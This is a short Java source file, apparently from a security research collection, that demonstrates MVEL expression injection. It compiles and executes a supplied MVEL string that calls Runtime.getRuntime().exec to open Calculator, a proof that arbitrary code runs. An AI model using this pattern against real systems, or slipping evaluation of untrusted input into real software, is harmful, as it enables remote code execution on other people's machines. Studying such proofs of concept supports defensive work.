package com.ppp.mvel;

import org.mvel2.MVEL;

import java.io.Serializable;
import java.util.HashMap;
import java.util.Map;

/**
 * @author Whoopsunix
 */
public class MVELAttack {
    public static void main(String[] args) {
        String poc = "Runtime.getRuntime().exec(\"open -a Calculator.app\")";
        System.out.println(eval(poc));
    }

    public static Object eval(String poc) {
        Map vars = new HashMap();
        Serializable serializable = MVEL.compileExpression(poc);
        vars.put("1", poc);
        Object o = MVEL.executeExpression(serializable, vars);
        return o;
    }
}
